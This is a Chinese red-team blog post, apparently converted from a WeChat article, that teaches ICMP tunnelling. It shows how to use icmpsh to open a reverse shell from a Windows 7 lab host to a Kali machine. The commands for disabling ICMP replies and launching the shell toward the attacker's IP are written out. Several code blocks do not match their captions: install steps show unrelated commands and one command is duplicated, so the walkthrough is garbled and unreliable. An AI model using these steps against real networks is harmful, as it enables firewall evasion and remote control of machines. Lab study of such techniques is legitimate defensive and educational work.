\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Z4WE0i12mondbNrTeTeOsQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **十** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），每周一更。

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

ICMP 隧道

‍  

ICMP 隧道是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定要开放端口，而在 ICMP 协议下就不需要。最常见的 ICMP 消息为 Ping 命令的回复，攻击者可以利用命令得到比回复更多的 ICMP 请求。在通常情况下，每个 Ping 命令都有相对应的回复与请求。

在一些条件下，如果攻击者使用各类隧道技术（HTTP，DNS，常规正反端口转发等）操作都失败了，常常会通过 ping 命令访问远程计算机，尝试进行 ICMP 隧道，将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而穿过防火墙（通常防火墙不会屏蔽 ping 数据包），‍实现不受限制的网络访问。

常见的 ICMP 隧道工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp 等。

**利用 ICMP 协议反弹 Shell**

**icmpsh**

* * *

icmpsh 工具使用简单，是一个跨平台工具，运行不需要管理员权限。

icmpsh 下载地址：

```
apt-get install python-impacket
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZC7ib5mKREsMzPT124TrUfiaG5kxMOYYyNg3501koVxQDesSf5HAteR6UQ/640?wx_fmt=png)

使用 icmpsh 需要安装 python 的 impacket 类库，以便对于各种协议进行访问。

安装 Python-impacket 库：

```
sudo apt-get update
sudo apt-get upgrade
```

安装库如果出现这种情况：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZC25VliaCBVE2qBTORnxYpyhvlfXefL7GZj3Yw7YCj5J3sROSXtfE6UPQ/640?wx_fmt=png)

那么更新一下 APT 库就好了：  

```
1.下载+解压+安装setuptools包：
root@kali:~#:wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz
root@kali:~#:tar zxvf setuptools-18.5.tar.gz
root@kali:~#:cd setuptools-18.5
root@kali:~#:python setup.py build
root@kali:~#:python setup.py install

2.下载+解压+安装pip
root@kali:~#:wget https://pypi.python.org/packages/source/p/pip/pip-7.1.2.tar.gz
root@kali:~#:tar zxvf pip-7.1.2.tar.gz
root@kali:~#:cd pip-7.1.2
root@kali:~#:sudo python setup.py install
```

如果没有 pip 的话那么安装 pip：

```
pip2 install impacket
```

如果还是不行那么就使用这条命令安装：

```
sysctl -w net.ipv4.icmp\_echo\_ignore\_all=1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZCCzXKoCz1moLBm2wibZSniaIecLiayWFMbM5icQ6K3AUlAibqdtbHzVwS2XA/640?wx_fmt=png)

因为 icmpsh 工具要代替系统本身的 ping 命令的应答程序，所以需要输入如下命令来关闭本地系统的 ICMP 答应（如果要恢复系统答应，则设置为 0），否则 Shell 的运行会不稳定.

```
python icmpsh\_m.py 192.168.217.129【kali】 192.168.217.132【win7】
```

实验完成后开启系统 ping 的话将最后的 1 改为 0 即可

在这里我说一下，运行 run.sh 会出错，不知道为啥：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZCwSto0bWFbjx5UOSCy6Q89N2vQrUrJBFEQrGS4ic0LHFVnlCNC36TkwQ/640?wx_fmt=png)

于是我使用了 icmpsh 的 Python 脚本运行：

```
icmpsh.exe -t 192.168.217.129
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZCcxnG2Hg0lBltf9Opvczcp6KLf6E6U3BG4dgApsXgd1pxkiaOicEIAVmA/640?wx_fmt=png)

然后在 Win7 上执行命令：

```
icmpsh.exe -t 192.168.217.129
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZCLS7aGfWE2ic5QwhNxDRfoVSkF5iaL4qo5ybNEekliaSm8U2UQofSibVNpw/640?wx_fmt=png)

这个时候就成功反弹 shell 到 kali：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLE46WIoBWf6wspRMpmqPZC7RxNKytDFhBdVZgyd6GcBvRrZnxuG0bbEdguvXnbE3KhiaI6CwBJXgA/640?wx_fmt=png)

* * *

参考文章：

https://pentestlab.blog/2017/07/28/command-and-control-icmp/

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看